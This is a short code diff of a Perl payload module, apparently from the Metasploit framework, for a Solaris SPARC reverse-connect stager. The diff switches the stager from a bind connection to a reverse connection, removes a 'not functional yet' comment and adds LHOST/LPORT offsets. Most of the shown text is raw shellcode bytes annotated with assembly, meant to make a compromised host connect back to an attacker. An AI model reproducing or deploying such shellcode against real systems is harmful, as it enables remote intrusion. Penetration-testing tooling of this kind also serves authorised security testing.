@@ -2,7 +2,7 @@ package Msf::PayloadComponent::SolarisReverseStager;
 use strict;
 use base 'Msf::PayloadComponent::SolarisPayload';
 sub load {
-  Msf::PayloadComponent::SolarisPayload->import('Msf::PayloadComponent::BindConnection');
+  Msf::PayloadComponent::SolarisPayload->import('Msf::PayloadComponent::ReverseConnection');
 }
 
 my $info =
@@ -11,12 +11,11 @@ my $info =
     'Arch'         => [ 'sparc' ],
     'Priv'         => 0,
     'OS'           => [ 'solaris' ],
-    'Multistage'   => 1,
+    'Multistage'   => 1,      
     'Size'         => '',
-
     'SolarisPayload' =>
-    {
-		# XXX - not functional yet
+    {   
+        Offsets => { 'LPORT' => [10, 'n'], 'LHOST' => [12, 'ADDR'] },   
         Payload =>
             "\x40\x00\x00\x04".     # call         0x10368
             "\x90\x10\x20\x02".     # mov          2, %o0
@@ -40,7 +39,6 @@ my $info =
             "\x91\xd0\x20\x08".     # ta           0x8
             "\x9f\xc3\x80\x00".     # jmpl         %sp, %o7
             "\xac\x1d\x80\x16",     # xor          %l6, %l6, %l6
-    
     },
 };
 
